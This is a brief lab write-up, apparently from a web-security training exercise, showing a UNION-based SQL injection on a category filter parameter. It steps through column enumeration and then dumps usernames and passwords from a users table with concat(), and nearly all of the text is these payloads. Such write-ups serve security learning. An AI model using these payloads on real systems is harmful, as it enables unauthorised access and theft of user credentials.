#### First we start off with out columns enumeration

```
/filter?category=Pets'+UNION+SELECT+null--            #Error response
/filter?category=Pets'+UNION+SELECT+null,null--       #200 OK
/filter?category=Pets'+UNION+SELECT+null,null,null--  #Error response
```

#### Next we check which column we can inject our code

```
/filter?category=Pets' union select 'a',null--        #Error response
/filter?category=Pets' union select null,'a'--        #200 OK
```

#### Following the same procedure as the last lab we get username and password column. So, next we use the mysql concat() function to print all the username and passwords

```
/filter?category=Pets' union select null,concat(username,'---',password) from users--
```

### Results
![image](https://user-images.githubusercontent.com/86168235/125508688-b4ddb8a3-214c-4a55-b992-771b9ee4331a.png)
